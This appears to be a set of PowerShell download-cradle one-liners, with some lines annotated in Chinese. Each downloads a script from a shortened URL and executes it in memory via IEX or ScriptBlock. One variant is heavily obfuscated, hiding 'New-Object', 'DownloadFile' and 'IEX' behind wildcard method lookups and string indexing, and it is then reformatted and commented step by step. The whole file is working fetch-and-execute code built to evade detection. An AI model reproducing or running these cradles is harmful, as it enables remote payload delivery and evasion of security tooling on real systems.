(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e', 'Default_File_Path.ps1'); IEX(( -Join ([IO.File]::ReadAllBytes('Default_File_Path.ps1') | ForEach-Object { [Char]$_ })))

(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e', 'Default_File_Path.ps1'); [ScriptBlock]::Create(( -Join ([IO.File]::ReadAllBytes('Default_File_Path.ps1') | ForEach-Object { [Char]$_ }))).InvokeReturnAsIs()

Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e'; SI Variable:/0W 'Net.WebClient'; Set-Item Variable:\gH 'Default_File_Path.ps1'; ls _-*; Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods | ? { $_.Name -like '*Cm*t' }).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand | GM | ? { $_.Name -like '*om*e' }).Name).Invoke('*w-*ct', $TRUE, 1))(Get-ChildItem Variable:0W).Value); Set-Variable J ((((Get-Variable igZ -ValueOn) | GM) | ? { $_.Name -like '*w*i*le' }).Name); (Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value, (GV gH).Value); &( ''.IsNormalized.ToString()[13, 15, 48] -Join '')( -Join ([Char[]](CAT -Enco 3 (GV gH).Value)))


Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e'; 
SI Variable:/0W 'Net.WebClient'; 
Set-Item Variable:\gH 'Default_File_Path.ps1'; 
ls _-*; 
Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods | ? { $_.Name -like '*Cm*t' }).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand | GM | ? { $_.Name -like '*om*e' }).Name).Invoke('*w-*ct', $TRUE, 1))(Get-ChildItem Variable:0W).Value); 
Set-Variable J ((((Get-Variable igZ -ValueOn) | GM) | ? { $_.Name -like '*w*i*le' }).Name); (Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value, (GV gH).Value); 
&( ''.IsNormalized.ToString()[13, 15, 48] -Join '')( -Join ([Char[]](CAT -Enco 3 (GV gH).Value)))



# 设置变量 HJ1 为 http://bit.ly/L3g1tCrad1e
Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e'; 
# 设置变量 0W 为 Net.WebClient
SI Variable:/0W 'Net.WebClient'; 
# 设置变量 gH 为 Default_File_Path.ps1
Set-Item Variable:\gH 'Default_File_Path.ps1'; 
# 列出当前目录下所有以下划线 _ 开头的文件和文件夹
ls _-*; 
Set-Variable igZ (
    
    .$ExecutionContext.InvokeCommand.(
        (
            $ExecutionContext.InvokeCommand.PsObject.Methods | ? { $_.Name -like '*Cm*t' }
        ).Name
    ).Invoke(
        $ExecutionContext.InvokeCommand.(
            ($ExecutionContext.InvokeCommand | GM | ? { $_.Name -like '*om*e' }).Name
        ).Invoke('*w-*ct', $TRUE, 1)
    )(Get-ChildItem Variable:0W).Value
); 
Set-Variable J (
    (
        (
            (Get-Variable igZ -ValueOn) | GM
        ) | ? { $_.Name -like '*w*i*le' }
    ).Name
); 
(Get-Variable igZ -ValueOn).(
    (ChildItem Variable:J).Value
).Invoke(
    (Get-Item Variable:/HJ1).Value, (GV gH).Value
); 
&( ''.IsNormalized.ToString()[13, 15, 48] -Join '')( 
    -Join ([Char[]](CAT -Enco 3 (GV gH).Value))
)



